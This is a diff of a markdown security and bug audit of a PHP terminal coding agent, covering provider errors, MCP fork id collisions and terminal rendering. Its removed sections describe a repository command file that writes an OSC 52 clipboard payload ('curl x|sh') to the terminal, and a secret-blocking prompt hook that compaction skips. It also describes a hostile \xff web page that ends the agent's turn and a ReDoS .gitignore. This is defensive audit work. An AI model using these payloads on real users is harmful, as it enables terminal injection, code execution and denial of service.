-- **Failure scenario:** the vendored gax REST transport (`gax/src/Transport/RestTransport.php:176-177`) converts every Guzzle `RequestException` into `Google\ApiCore\ApiException::createFromRequestException()`. That exception carries the **gRPC** code (`getCode()` gives 8, 14 or 13) and `getStatus()` gives `RESOURCE_EXHAUSTED` and so on. It has **no `previous`** and no `getStatusCode()`. **Repro:** HTTP 429, 503, 500 and 401, and a gRPC-style `UNAVAILABLE(14)`, all return `isTransient=false`. Vertex quota 429s are routine on shared projects, and so are model-overloaded 503s. Every one is reported as a permanent `isError`, with no retry, and Runtime then discards the message (A1), so the user sees an empty reply. `VertexProvider.php:1551-1555` documents that `ApiException` "is caught by complete() and classified by TransientFailure::isTransient()". That claim is false.
+- **Failure scenario:** the vendored gax REST transport (`gax/src/Transport/RestTransport.php:176-177`) converts every Guzzle `RequestException` into `Google\ApiCore\ApiException::createFromRequestException()`. That exception carries the **gRPC** code (`getCode()` gives 8, 14 or 13) and `getStatus()` gives `RESOURCE_EXHAUSTED` and so on. It has **no `previous`** and no `getStatusCode()`. **Repro:** HTTP 429, 503, 500 and 401, and a gRPC-style `UNAVAILABLE(14)`, all return `isTransient=false`. Vertex quota 429s are routine on shared projects, and so are model-overloaded 503s. Every one is reported as a permanent `isError`, with no retry, so the turn fails on the first quota error. (Before the A1 fix the user then saw an empty reply; the error is now shown, but still not retried.) `VertexProvider.php:1551-1555` documents that `ApiException` "is caught by complete() and classified by TransientFailure::isTransient()". That claim is false.
 - **Fix:** add an arm `if ($link instanceof \Google\ApiCore\ApiException) return in_array($link->getStatus(), ['RESOURCE_EXHAUSTED','UNAVAILABLE','DEADLINE_EXCEEDED','INTERNAL','ABORTED'], true);`, guarded by `class_exists`. Also map `ApiException` without a status to network errors.
 - **Test:** the repro as a data provider in `TransientFailureTest`. Add a Vertex `complete()` test with a predictor that throws `ApiException(…, 8, 'RESOURCE_EXHAUSTED')`, asserting `errorTransient === true`.
 
@@ -19849,16 +19763,16 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Fix:** fold `thoughtsTokenCount` into a reasoning or output bucket, add a `thinkingConfig.thinkingBudget` setting, and raise the default `maxOutputTokens` for 2.5 models (for example 32k), or omit it.
 - **Test:** `parseUsageMetadata(['promptTokenCount'=>10,'candidatesTokenCount'=>5,'thoughtsTokenCount'=>900], 'gemini-2.5-pro')` should account for the 900 tokens.
 
+#### A22 — `CommandBackend` and `StreamingCommandBackend` still encode history without `JSON_INVALID_UTF8_SUBSTITUTE`
+- **Severity:** Medium · **Confidence:** Verified-by-reading (found while fixing A6)
+- **Where:** `src/Backend/CommandBackend.php:410-413` (`encodeHistory()`) and `src/Backend/StreamingCommandBackend.php:218-224` (`begin()`). Both call `json_encode(..., JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE)`.
+- **Failure scenario:** this is the UTF-8 residue of A6/F-T1. The tool-result scrub (`f33cd55fd`) and the loader scrub (`218384747`) cover the engine path. These two backends encode Chat's own history rows, which neither scrub touches. One invalid byte in any row (for example a pasted Latin-1 snippet) makes `json_encode` return `false`, and every later turn on a command backend answers `_[error: failed to encode history]_`.
+- **Fix:** add `JSON_INVALID_UTF8_SUBSTITUTE` to both calls, or route both through one shared encoder.
+- **Test:** a history row containing `"caf\xe9"` should reach the command's stdin as valid UTF-8 with U+FFFD, on both backends.
+
 ---
 
 ### B. Engine fork protocol and process lifecycle
-
-#### B1 — MCP stdio connections are opened in the TUI parent and used from forked turn children whose JSON-RPC id counter resets on every fork; a killed call poisons the next turn with the wrong result
-- **Severity:** High · **Confidence:** Verified-by-repro (`repro_mcp_ids.php` with `fake_mcp.php`)
-- **Where:** the fork is at `src/Backend/EngineBackend.php:1354-1365`. Servers start in the parent at `src/Cli/Bootstrap.php:6337` (`$client->startServers()`). The transport is `sugar-mcp/src/StdioMcpServer.php:414-421` (`$id = (string) $this->nextId++;`) and `:559-587` (`readResponse` skips lines only when the id differs). Kill sites are `EngineBackend.php:1411-1414` (teardown SIGKILL on Esc, cancel or the 120s idle timeout) and `Runtime.php:2040-2043` (parallel deadline).
-- **Failure scenario:** turn 1's child calls MCP tool `slow` with id N. The user presses Esc, or the 120s watchdog (known #7) fires, and the child is SIGKILLed. The MCP server still writes `{"id":"N", result-of-slow}` into the pipe the parent holds. Turn 2's child is forked from the parent, which still has `nextId == N` and an empty read buffer. It calls `fast` with id N again, reads the stale line first, the ids match, and it returns **"result of slow"** (repro output: `turn 2 asked for 'fast', got: result of slow`). The real response for `fast` stays in the pipe, so every later call on that server gets the previous call's result for the rest of the session. The model is fed confidently wrong data with no error shown.
-- **Fix:** either own MCP clients only in the parent and proxy calls over the (bidirectional) frame socket, or give each process its own connection. Cheap mitigations: generate ids as `getmypid() . '-' . random`; drain and discard any pending unread lines before a request; restart the server connection after any child is killed mid-call. **LSP has the same flaw but it is latent today.** `src/LSP/LspConnection.php:30` and `:381` use the same `(string) $this->nextId++` counter. However, `Bootstrap::lspTool()` (`Bootstrap.php:6624-6627`) wires `LspTool` with a null client, and nothing in `src/` calls `LspConnection::connect()`. The B1 fix must therefore also cover LSP before LSP is wired (synthesis Wave 3.F).
-- **Test:** the repro, as a phpunit test: start a fake server in the parent, fork and kill mid-call, fork and call a different tool, and assert the result names the tool that was asked for.
 
 #### B2 — Esc or watchdog teardown kills only the turn process; the shell command it was running keeps going as an orphan
 - **Severity:** Medium · **Confidence:** Verified-by-repro (`repro_orphan.php`)
@@ -19901,11 +19815,18 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Fix:** on a short write, mark the stream dead and exit the child non-zero. On a bad header, call `teardown('frame stream corrupted')` instead of continuing.
 - **Test:** feed `drainFrames` a truncated frame followed by a valid frame, and assert that the stream is declared corrupt rather than silently producing nothing.
 
+#### B7 — The LSP client has unique ids but no cross-process exchange lock (latent)
+- **Severity:** Low (latent: nothing connects an `LspConnection` today) · **Confidence:** Verified-by-reading
+- **Where:** `src/LSP/LspConnection.php`. `e6f6aee54` moved its ids onto the shared pid-tagged `RequestIdSequence`, the id half of the B1 fix. The MCP stdio transport also got a locked request/response exchange and a shared read buffer (`ea6e178fd`); LSP did not.
+- **Failure scenario:** once LSP is wired (synthesis Wave 3.F), forked turn children that share one connection can interleave writes and read each other's replies. The ids no longer collide, but a child can still consume and discard a line meant for a sibling.
+- **Fix:** before LSP is wired, give `LspConnection` the same per-connection exchange lock and shared read buffer the MCP stdio transport uses, or give each process its own connection.
+- **Test:** fork two children on one connection to a fake LSP server with random reply delays, and assert each gets its own result.
+
 ---
 
 ### C. Runtime
 
-These are covered above: A1 (Runtime discards `errorMessage`), B2 (deadline kill orphans), and B4 (no usage channel on tool results).
+These are covered above: B2 (deadline kill orphans) and B4 (no usage channel on tool results).
 
 #### C1 — A parallel batch made only of deadline-exempt jobs never settles if `waitpid` returns -1 (latent; not reachable today)
 - **Severity:** Info (latent hardening) · **Confidence:** Verified-by-reading that it is **not reachable** in the current tree. Downgraded from Low/Suspected.
@@ -19928,7 +19849,7 @@ These are covered above: A1 (Runtime discards `errorMessage`), B2 (deadline kill
 #### C3 — Project instructions (`CLAUDE.md`/`AGENTS.md` + every `@import`) have no byte budget, while rules have 64 KiB
 - **Severity:** Low · **Confidence:** Verified-by-reading
 - **Where:** `src/Runtime.php:3009-3041` adds every `loadRoot()`/`loadForced()` document in full. Compare `:2963-2999` and `:3050+`, where user and project rules share `MAX_STANDING_RULE_BYTES = 65_536` (`:161`) with pointer deferral. `src/Context/InstructionFileLoader.php:841-871` expands `@imports` through `ImportResolver` with a depth cap but no size cap. Ancestor `CLAUDE.md`/`AGENTS.md` files (`:401-461`) are added on top.
-- **Failure scenario:** a checked-in `CLAUDE.md` that writes `@docs/ARCHITECTURE.md` or `@README.md`, or a parent-directory `AGENTS.md`, puts hundreds of KB into **every** request's system prompt, with no notice. Known #21 says the token estimate ignores the system prompt, so Chat's tiers never see the cost. On a 128k or 200k window this overflows silently: on SGLang via A2, and on Vertex/Custom via A1. On this monorepo, the root `CLAUDE.md` with its two imports is already 25,110 B (`InstructionFileLoader.php:176`).
+- **Failure scenario:** a checked-in `CLAUDE.md` that writes `@docs/ARCHITECTURE.md` or `@README.md`, or a parent-directory `AGENTS.md`, puts hundreds of KB into **every** request's system prompt, with no notice. Known #21 says the token estimate ignores the system prompt, so Chat's tiers never see the cost. On a 128k or 200k window this overflows on every request. On this monorepo, the root `CLAUDE.md` with its two imports is already 25,110 B (`InstructionFileLoader.php:176`).
 - **Fix:** charge instruction documents against the same per-build budget (or their own, for example 64 KiB). When a document doesn't fit, defer it to a pointer line the way rules are deferred, and report the overflow as a runtime notice.
 - **Test:** a fixture repo whose `CLAUDE.md` imports a 200 KB file should produce a system prompt under the budget, containing a pointer to the deferred import.
 
@@ -19938,11 +19859,6 @@ These are covered above: A1 (Runtime discards `errorMessage`), B2 (deadline kill
 
 | ID | Severity | Confidence | Title | Location |
 |---|---|---|---|---|
-| A1 | High | repro | Provider `isError` responses become silent empty replies; `errorMessage` never read (two existing tests pin the bug) | Runtime.php:1419-1459, 1496-1567 |
-| A2 | High | repro | SGLang in-stream `{"error":…}` event ignored; turn "succeeds" | SglangProvider.php:769-818 (also Custom) |
-| A6 | High | repro | Non-UTF-8 tool output fails the next request permanently (non-transient); Vertex sends an empty body | SglangProvider.php:648/686; CustomProvider; VertexProvider.php:2410; CapturesProcessOutput |
-| B1 | High | repro | MCP ids reset per fork; a killed call gives the next turn the wrong result, permanently off by one (LSP: same flaw, latent) | EngineBackend.php:1354; sugar-mcp StdioMcpServer.php:416/582 |
-| A3 | Medium | repro | Stream dropped with no `finish_reason` treated as a complete answer (also Custom, Vertex) | SglangProvider.php:836-904; VertexProvider.php:380-403 |
 | A4 | Medium | repro | Tool calls dropped when `finish_reason='stop'` or `delta:null` | SglangProvider.php:779, 2048; CustomProvider.php:308, 620 |
 | A7 | Medium | repro | `JSON_FORCE_OBJECT` replays list arguments as objects | ToolSchema.php:186 |
 | A8 | Medium | repro | Recovered DSML/XML markup stays in content (painted, then sent twice) | SglangProvider.php:785-871 |
@@ -19954,11 +19870,12 @@ These are covered above: A1 (Runtime discards `errorMessage`), B2 (deadline kill
 | **A19** | Medium | repro | Vertex `ApiException` (429/503/500) never classified transient: no retry, then empty reply | TransientFailure.php:197-237, 405-422; VertexProvider.php:318, 404, 1384 |
 | **A20** | Medium | reading | Bedrock tables match only bare ids: real versioned/profile ids get an 8k window and an invented $0.01/1k | BedrockProvider.php:46, 146-169 |
 | **A21** | Medium | suspected | Gemini 2.5 default thinking: thought tokens missing from Usage and sharing the 4096 `maxOutputTokens` | VertexProvider.php:1459, 1770-1793 |
+| **A22** | Medium | reading | `CommandBackend`/`StreamingCommandBackend` encode history without `JSON_INVALID_UTF8_SUBSTITUTE` (UTF-8 residue of A6) | CommandBackend.php:410; StreamingCommandBackend.php:218 |
 | B2 | Medium | repro | Esc/watchdog SIGKILL leaves setsid'd Bash commands running | EngineBackend.php:1411-1414 |
 | B4 | Medium (High paid) | reading | Task sub-agent spend never reaches the parent, session total or cap | TaskTool.php:604-608; ToolResult.php; EngineBackend.php:890-941 |
 | **C2** | Medium | reading | `error_log()` diagnostics (notice sink, parsers, per-request `</parameter>` warning) paint over the TUI frame | RuntimeNoticeSink.php:366-369; SglangProvider.php:2409; Dsml/Minimax parsers |
 | A18 | (sharpens #27/#28) | suspected | Default SGLang `max_tokens` 4096 with effort `max` | SglangProvider.php:1030, 165 |
-| A5 | Low | repro | `data:` with no space ignored | SglangProvider.php:769; CustomProvider.php:291 |
+| A5 | Low | repro | `data:` with no space ignored (now a premature-end error since A3's fix, not a silent empty reply) | SglangProvider.php:769; CustomProvider.php:291 |
 | A11 | Low | reading | Malformed argument JSON runs the tool with `[]`; model not told | CustomProvider.php:628; SglangProvider.php:2221 |
 | A14 | Low | reading | OpenAI bills cached tokens at full rate | OpenAIProvider.php:521-535 |
 | A16 | Low | repro (shape) | Bedrock: no same-role merge, blank text blocks | BedrockProvider.php:316-332 |
@@ -19966,10 +19883,11 @@ These are covered above: A1 (Runtime discards `errorMessage`), B2 (deadline kill
 | B3 | Low | repro | Socketpair fds leak into spawned processes and delay EOF | EngineBackend.php:1343-1370 |
 | B5 | Low | reading | Two withers drop the spend cap (latent) | EngineBackend.php:542, 575 |
 | B6 | Low | repro | Frame write times out mid-frame silently; the following `result` frame is swallowed | EngineBackend.php:1742-1796 |
+| **B7** | Low (latent) | reading | LSP client: unique ids since B1, but no cross-process exchange lock; needed before LSP is wired | LspConnection.php |
 | **C3** | Low | reading | Project instructions and `@imports` have no byte budget (rules have 64 KiB) | Runtime.php:3009-3041; InstructionFileLoader.php:841-871 |
 | C1 | Info | reading | `waitpid -1` never settles an exempt parallel job: latent, no SIGCHLD reaper exists | Runtime.php:2012, 2034 |
 
-New in the final pass: **A19, A20, A21, C2, C3**. Re-graded: B6 (Suspected → Verified-by-repro), A16 (Suspected → wire shape verified by repro), C1 (Low/Suspected → Info, not reachable). Sharpened: A1 (the tests that pin the bug; the fix placement that keeps `ReasoningProgressTest` green), A3 (Vertex has no end-of-stream check either), A6 (Vertex empty-body variant), A13 (fix aligned with the `contextWindow()` contract), B1 (LSP is latent with the same flaw).
+New in the final pass: **A19, A20, A21, C2, C3**. Re-graded: B6 (Suspected → Verified-by-repro), A16 (Suspected → wire shape verified by repro), C1 (Low/Suspected → Info, not reachable). Sharpened: A13 (fix aligned with the `contextWindow()` contract). Items sharpened in that pass and since fixed are listed under **Fixed since audit**.
 
 ---
 
@@ -19987,7 +19905,7 @@ New in the final pass: **A19, A20, A21, C2, C3**. Re-graded: B6 (Suspected → V
 - Read outside scope, where a finding depended on it: `src/Agents/EngineExecutor.php`, `TaskTool.php:440-630`, `Tools/Concerns/CapturesProcessOutput.php`, `MCP/StdioMcpServer.php` with `sugar-mcp/src/StdioMcpServer.php`, `LSP/LspConnection.php` (id counter), `Context/InstructionFileLoader.php`, `Diagnostics/RuntimeNoticeSink.php`, `Cli/Bootstrap.php:6585-6627`, `Chat.php` (notice pump, 9240-9340), `candy-pty/src/SignalForwarder.php`, and `vendor/google/gax` (`ApiException`, `RestTransport`).
 
 **Leads from the checkpoint, and how each was resolved:**
-1. LSP fork hazard: **same flaw, latent.** `LspTool` is wired with a null client and nothing calls `LspConnection::connect()`. Folded into B1.
+1. LSP fork hazard: **same flaw, latent.** `LspTool` is wired with a null client and nothing calls `LspConnection::connect()`. Folded into B1 (now fixed; the LSP exchange lock that remains is B7).
 2. `ProviderException` exit code read as an HTTP status: **dropped.** `ProviderException` exposes `exitCode` as a property, not `getStatusCode()`, so `TransientFailure::statusCode()` returns null and a CLI failure is correctly non-transient. Following this lead turned up the real classification gap for Vertex `ApiException`, written up as **A19**.
 3. Vertex `defaultStreamer()` SSE parsing: **no new framing defect.** The streamer accepts `data:` without a space, CRLF via `trim`, and a trailing unterminated event. Errors arrive as `isError` chunks and so run into A1. The missing end-of-stream check was added to A3, and the classification gap is A19.
 4. Uncapped project instructions: **confirmed** as C3. The other half of the lead (`RuleLoader` re-reading disk every step) is a performance cost only and was not reported. `InstructionFileLoader::loadRoot()` is cached per session.
@@ -20006,6 +19924,18 @@ New in the final pass: **A19, A20, A21, C2, C3**. Re-graded: B6 (Suspected → V
 - Live provider behaviour: Bedrock's Converse rejection (A16), the bare-id on-demand refusal (A20, last sentence), SGLang reasoning-token use (A18) and Gemini thinking budget use (A21). They need credentials or a live model; this audit made no outbound model calls.
 - The real gax REST server-stream decoding of `streamRawPredict` SSE bodies. It is exercised only through `VertexProviderTest`'s seams, not against Google.
 - C2's on-screen corruption was established from code plus the fd-2 destination check, without a PTY capture of the running TUI.
+
+---
+
+### Fixed since audit
+
+These findings were fixed on master after the audit. Their sections and table rows were removed.
+
+- **A1** Provider `isError` responses became silent empty replies — fixed on master in `ea81820fb`. Residual: `AgentManager::executeSubAgent()` swallows provider errors the same way (15e AG-4).
+- **A2** SGLang/Custom in-stream `{"error":…}` events ignored — fixed on master in `4c22a9b7a`.
+- **A3** A stream that ends without a finish signal treated as complete — fixed on master in `9105a64ae`. A5 now surfaces through this path as a premature-end error.
+- **A6** One non-UTF-8 byte in tool output failed every later request — fixed on master in `f33cd55fd` (scrub at `Runtime::settle()`, shared with 15c F-T1). Residual: the two command backends (A22).
+- **B1** MCP ids reset per fork; a killed call shifted every later result — fixed on master in `ea6e178fd` (process-unique ids, locked exchanges, shared read buffer); LSP ids in `e6f6aee54`. Residual: the LSP exchange lock (B7); a lock file per MCP server is left behind if the TUI is killed.
 
 
 ---
@@ -20032,26 +19962,6 @@ Confidence labels:
 ---
 
 ### A. Turn state machine and queue
-
-#### 15b-01 — A UserPromptSubmit hook is skipped when the prompt is parked behind the 85% model compaction
-- **Severity:** High · **Confidence:** Verified-by-repro (`r6_hook_bypass.php`)
-- **Where:** `src/Chat.php:7317` (`scheduleParkedCompaction()` is called inside `submit()`) runs before `src/Chat.php:7460` (`dispatchTurnHooks()`). The parked route resumes in `applyModelCompaction()` → `->dispatchTurn($compacted->history, [], $tokenLimit)` at `src/Chat.php:11703`. That route never calls `dispatchTurnHooks()`. The only call site is :7460.
-- **Code:**
-  ```php
-  $parked = $this->scheduleParkedCompaction($text, $tokenCount, $tokenLimit, $capNotice);
-  if ($parked !== null) { return $parked; }          // returns BEFORE the hook gate
-  ...
-  [$turnHookNotes, $turnHookRefusal] = $this->dispatchTurnHooks($text);   // :7460, never reached
-  ```
-- **Failure scenario:** The user has a `UserPromptSubmit` hook that blocks prompts containing secrets, the usual reason to have one. While history is under the tier, the hook fires and blocks. Once history passes the automatic-compaction tier and a `summaryBackend` is configured (the production default, `Bootstrap::summaryBackend()`), the same prompt is parked and the summary is requested. When the summary lands, the prompt is sent to the main model with the hook never run.
-  - Repro, same prompt `deploy with AWS_SECRET_ACCESS_KEY=AKIA…`:
-    - small history: `hook fired=1, main calls=0`
-    - past the tier: `hook fired=0, main calls=1 (secret rows=1)`
-  - The hook's `additionalContext` is lost as well, and `SessionStart` is skipped.
-- **Fix:** Run `dispatchTurnHooks($text)` in `submit()` before the compaction tiers, or at least before `scheduleParkedCompaction()`.
-  - If the hook refuses, return the refusal and do not park.
-  - Carry the hook notes on the parked request (for example in a `HistoryCompactedMsg` field) and prepend them in `applyModelCompaction()`.
-- **Test:** Build a Chat with `compactablePairs()` history, a `summaryBackend`, and a `deny` `UserPromptSubmit` hook. Submit. Assert that no summarization Cmd is returned, that `$main->calls() === 0`, and that the last row is the `Hook denied:` notice.
 
 #### 15b-02 — After a double-Escape cancel, tool placeholders stay "running" forever; later results land on the wrong row
 - **Severity:** High · **Confidence:** Verified-by-repro (`r2_stale_placeholder.php`)
@@ -20224,28 +20134,6 @@ Confidence labels:
 
 ### E. Repository-supplied and model-supplied text in overlays and panes
 
-#### 15b-16 — A cloned repository's command file writes raw escapes (OSC 52 clipboard write, screen clear) to the terminal as soon as the user types "/"
-- **Severity:** High · **Confidence:** Verified-by-repro (`r15_overlay_inject.php`)
-- **Where:**
-  - `CommandSpec::fromFile()` → `stringField()` (`src/Commands/CommandSpec.php:866`) copies the frontmatter `description` and `argument-hint` verbatim. Only the *name* is validated, against `NAME_PATTERN`.
-  - `CommandLoader::loadAll()` loads `<root>/.sugar-crush/commands/*.md` for **every** checkout. `trustedProjectCommands` gates only `` !`…` `` execution (`Chat::refuseCommandShell()`), not loading or display.
-  - `Renderer::renderSlashMenu()` concatenates `' — ' . $spec->description` (`src/Renderer.php:3936`) and the hint (`:3990`) into the popup with no sanitizer. `clipToWidth()` is a plain `mb_substr`, used only when the text is too wide.
-  - The popup is joined into the frame at `:1365` without passing through `untrusted()`.
-- **Code:**
-  ```php
-  $tail = self::clipToWidth(' — ' . $spec->description, $budget - Width::string('/' . $plainName . $hint));
-  ...
-  $lines[] = $rowStyle->render(($index === $selected ? '▸ ' : '  ') . '/' . $name . $hint . $tail);
-  ```
-- **Failure scenario:** A repository ships `.sugar-crush/commands/lint.md` with `description: "Run lint \e]52;c;<base64 of 'curl x|sh'>\a\e[2J"` (YAML double-quoted `\e` is ESC). The user clones it, starts sugar-crush and types `/`, the normal first step to see what commands exist. The popup row puts `ESC ] 52 ; c ; … BEL` on the wire. Terminals that honour OSC 52 (kitty, WezTerm, Alacritty, Windows Terminal, iTerm2 when allowed, tmux with `set-clipboard on`) replace the clipboard with the attacker's text, ready for the user's next paste. `\e[2J` and cursor moves can also repaint the popup or the screen around it.
-  - Repro: the slash popup leaks `OSC52, CSI2J, CR`. `/help` and the Ctrl+P palette are clean for the same spec: `/help` goes through markdown, and the palette does not list the description.
-  - No trust step is involved, and no command needs to run.
-- **Fix:**
-  - Sanitize at the boundary. In `CommandSpec::fromFile()`, pass `description` and `argument-hint` through `PaneLabel::of()`, which strips `\p{C}` (C1 included) and flattens line breaks.
-  - Also apply `self::untrusted()` plus newline flattening inside `renderSlashMenu()`, as defence in depth for `CommandSpec::new()` callers.
-  - Audit the remaining `CommandSpec` text consumers (`/help`, the palette, `KeyHelp`) against the same rule.
-- **Test:** Load a temporary project command whose description contains `\e]52;c;eA==\a`, `\e[2J` and `\r\n`. Type `/` and render. Assert the frame contains no `\e]`, no `\e[2J` and no `\r`, and that the popup row is a single line.
-
 #### 15b-17 — Model or tool text containing U+E002+n paints a copy of on-screen image n at a position the text chooses, and blanks Nerd Font glyphs (lead 3)
 - **Severity:** Low-Medium · **Confidence:** Verified-by-repro (`r10_forged_marker.php`)
 - **Where:**
@@ -20358,10 +20246,8 @@ Confidence labels:
 
 | ID | Sev | Conf | Title |
 |---|---|---|---|
-| 15b-01 | High | Repro | UserPromptSubmit hook skipped on the parked 85% compaction route (secret-blocking hook does nothing) |
 | 15b-02 | High | Repro | Cancelled turn's "running" placeholders never healed; later same-id results land on the old row |
 | 15b-07 | High | Repro | Raw CR reaches the terminal (user/system rows, tool name/description, expanded tool output): pane overwrite and diff desync |
-| 15b-16 | High | Repro | A cloned repository's command-file description puts OSC 52 (clipboard write) and screen clears on the wire when "/" is typed |
 | 15b-03 | Med-High | Repro | Command output, mid-turn notices and background/runtime notices go to the model as real turns |
 | 15b-10 | Med-High | Repro | Full-history markdown re-render every frame: 0.7 s/keystroke at 200 exchanges; 2.1 s/frame for a 200 KB streaming partial |
 | 15b-04 | Medium | Reading | UserPromptSubmit/SessionStart hooks run synchronously inside update() (up to 60 s freeze) |
@@ -20454,6 +20340,15 @@ Confidence labels:
 | `r20_rewind_args.php` | `/rewind help` rewinds; `/rename:x` stores `:x` (15b-22) |
 | `dbg.php` / `dbg2.php` | Scratch only |
 
+---
+
+### Fixed since audit
+
+These findings were fixed on master after the audit. Their sections and table rows were removed; the repro and coverage lists above still name them.
+
+- **15b-01** UserPromptSubmit hook skipped on the parked 85% compaction route — fixed on master in `9c13a918e`. Residual: if the summary later refuses the turn (spend cap or the 95% tier), the hook has already seen the prompt.
+- **15b-16** A cloned repository's command-file description wrote OSC 52 and screen clears to the terminal on "/" — fixed on master in `cb3dee7fd`.
+
 
 ---
 
@@ -20469,31 +20364,15 @@ Scope: `src/Tools/` (built-ins, Concerns, PathJail, IgnoreRules, McpToolBridge),
 Checkout: master @ `05db616f3`, PHP 8.3.6 CLI, `memory_limit=-1`.
 Repro scripts: `/home/sites/crush-research-repos/_audit-scratch/15c/rNN_*.php`. Every repro runs against `.../15c/root` and never against the real repo.
 
-Status: **final.** All scoped files were read, and every lead from the checkpoint was confirmed or dropped (see **Coverage** at the end). 31 findings: 4 High, 1 Med-High, 13 Medium, 3 Low-Medium, 10 Low.
+Status: **final.** All scoped files were read, and every lead from the checkpoint was confirmed or dropped (see **Coverage** at the end). 31 findings at audit time: 4 High, 1 Med-High, 13 Medium, 3 Low-Medium, 10 Low. Seven have since been fixed on master (see **Fixed since audit** at the end), so 24 remain: 1 Med-High, 10 Medium, 3 Low-Medium, 10 Low.
 
-> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources describe older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which says `Bash(rm *)` "never matched → Allow"). Both should be corrected. The real defects in the new matcher are narrower. F-P5 covers `$(…)`, backticks and redirection slipping past an allow rule. F-J3 covers path rules missing respellings.
+> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources described older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which said `Bash(rm *)` "never matched → Allow"). Both are now corrected; the PERMISSIONS.md section was rewritten in `d3d90fece` to describe argument-scoped matching, including the open F-P5 hole. The real defects in the new matcher are narrower. F-P5 covers `$(…)`, backticks and redirection slipping past an allow rule. F-J3 covers path rules missing respellings.
 
 **Relation to the known list (99-synthesis Part II).** Nothing below repeats a known item. Where a finding touches one, the overlap is stated.
 
 ---
 
 ### A. Tool output and encoding
-
-#### F-T1 — One non-UTF-8 byte in any tool result kills the turn (Read, Bash, WebFetch, Grep, MCP)
-- **Severity:** High. **Confidence:** Verified-by-repro (`r01_binary.php`).
-- **Where:** `src/Runtime.php:2368-2374` (`settle()` builds `ToolResultMessage` from `$result->content()` with no scrub). `src/Providers/SglangProvider.php:1586-1590` puts `content` straight into the request. `:649` / `:687` send it with Guzzle `'json' => $params`. `src/Tools/BuiltIn/Read.php:246` (`file_get_contents`) and `WebFetch.php` `transferPinned()` both return raw bytes. The WebFetch description promises the body comes back "verbatim".
-- **Excerpt:**
-  ```php
-  return new ToolResultMessage($toolCall->id(), $result->content(), ...);   // Runtime.php:2368
-  ...
-  $response = $this->httpClient->post('chat/completions', ['json' => $params, ...]);  // SglangProvider.php:649
-  ```
-- **Failure:** Read a Latin-1 or Windows-1252 file (common in legacy PHP, `.po` files and CSVs), any binary file, or a web page served as ISO-8859-1. Guzzle's `Utils::jsonEncode` throws `json_encode error: Malformed UTF-8 characters`, and the provider rethrows it as `RuntimeException('SGLANG request failed: …')`. The turn dies. Repro output:
-  `RuntimeException: SGLANG request failed: json_encode error: Malformed UTF-8 characters, possibly incorrectly encoded`.
-  Any hostile page can do this on purpose: one `\xff` byte in a WebFetch body ends the agent's turn every time it is fetched. That is a cheap denial-of-service against the agent and needs no permissions. The model also cannot read any non-UTF-8 file at all, because every attempt aborts the turn instead of returning an error it could react to.
-- **Fix:** Normalise once, at the single choke point, `Runtime::settle()` (and `Chat`'s twin), before the `ToolResultMessage` is built. Use `mb_scrub($content, 'UTF-8')`, or, for content that is mostly non-UTF-8, `mb_convert_encoding(..., 'UTF-8', 'UTF-8')` plus a `[binary file: N bytes, not shown]` short-circuit when the NUL or control-byte ratio is high (do this in Read/WebFetch). Also encode with `JSON_INVALID_UTF8_SUBSTITUTE` in providers as a backstop.
-- **Where the fix must go (lead resolved).** `tests/Providers/SglangProviderRequestBuildingTest.php:448-462` (`testUnencodableArrayJsonSchemaSurfacesAnErrorAtTheCallSite`) deliberately pins the throw, but only for a **caller-supplied `jsonSchema`**: a broken schema must fail loudly rather than ship. A provider-wide `JSON_INVALID_UTF8_SUBSTITUTE` would break that contract, so the provider backstop above should be dropped. The fix belongs at the source, which is the pattern `src/Context/EnvironmentBlock.php:845-880` already uses for the same Guzzle throw: repair at the producer, and *announce* the repair ("WHY HERE AND NOT IN THE PROVIDERS"). Scrub in `Runtime::settle()` and append a note such as `[N invalid UTF-8 sequences replaced]`. The dormant Chat tool path already passes `JSON_INVALID_UTF8_SUBSTITUTE` on its IPC (`Chat.php:4679`), so it does not have this bug. The engine path uses `serialize()` IPC (`Runtime.php:2404`), which preserves the bad bytes.
-- **Test:** Write `"caf\xe9\n"` to a temp root. Run Read. Feed the result through `Runtime::settle()` and then `SglangProvider::complete()` with a `MockHandler`. Assert no throw, and that the request body is valid UTF-8 containing U+FFFD and the repair note. Add a sibling test for WebFetch with a stubbed `\xff` body. Leave the jsonSchema throw test as it is.
 
 #### F-T2 — Edit ignores its own `$maxBytes`; a large file costs about 18× its size in RAM
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r06_edit_big.php`).
@@ -20526,7 +20405,7 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
   ...
   if (preg_match($rule['regex'], $scoped) === 1) { // verdict(): false (error) == no match
   ```
-- **Repro:** A `.gitignore` of 20 identical lines `**a**a**a**a**a**a**a**a**a**a**a**a**a**a**c` (about 900 bytes), and 2,000 empty files named `c` + 40×`a` + N. A single `ignores()` call took 0.094 s and ended with `Backtrack limit exhausted`. **`Glob '**/*'` took 138.97 s.** Grep over the same tree took 0.03 s, because it filters only grep's hits. A cloned repository supplies both the `.gitignore` and the files, so the model's first Glob in that repo runs past the 120 s turn deadline (known #7 covers the deadline; this is a new way to reach it, and Glob, unlike Bash, is not the model's choice to make slow). PCRE's backtrack limit makes each match fail instead of hang. That keeps the cost bounded per call, but the result is a **fail-open verdict**: a rule that errors is treated as not matching, so a negation (`!keep.me`) or a hide rule quietly stops applying. Ignore rules are not a security boundary, but F-J2 shows that `.env` relies on them in practice.
